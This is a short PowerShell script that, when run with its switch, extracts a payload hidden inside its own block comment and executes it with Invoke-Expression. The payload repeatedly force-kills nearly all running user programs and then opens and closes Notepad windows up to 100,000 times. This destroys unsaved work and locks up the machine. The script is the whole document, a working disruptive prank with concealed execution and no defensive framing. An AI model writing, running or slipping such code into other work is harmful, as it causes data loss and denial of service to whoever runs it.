param ( [switch]$oof = $false )
cd $PSScriptRoot

if ($oof) { (echo (((((Get-Content .\f-ur-ram.ps1).Replace("exit","")).Replace("<#","")).Replace("#>",""))[6..8]) -OutVariable ep); $ep = (echo $ep); Invoke-Expression $ep}
exit
<#
$tasks = ( (tasklist -fi "MEMUSAGE gt 10000" -fi "IMAGENAME ne powershell.exe" -fi "IMAGENAME ne powershell_ise.exe" -fi "IMAGENAME ne opera.exe" -fi "SESSIONNAME ne Services" -fi "STATUS eq running" -nh -fo csv) | ForEach-Object { ((($_).split(","))[0]).replace('"',"") } ).replace(".exe","")
function tasks() { $tasks | ForEach-Object { Stop-Process -Name $_ -ErrorAction SilentlyContinue } }
$(1..100000) | ForEach-Object { tasks; (echo $_ > ($tmp = New-TemporaryFile)); Start-Process notepad.exe $tmp -WindowStyle Maximized; $i += 1; Start-Sleep -Milliseconds 250; Stop-Process -Name notepad }
#>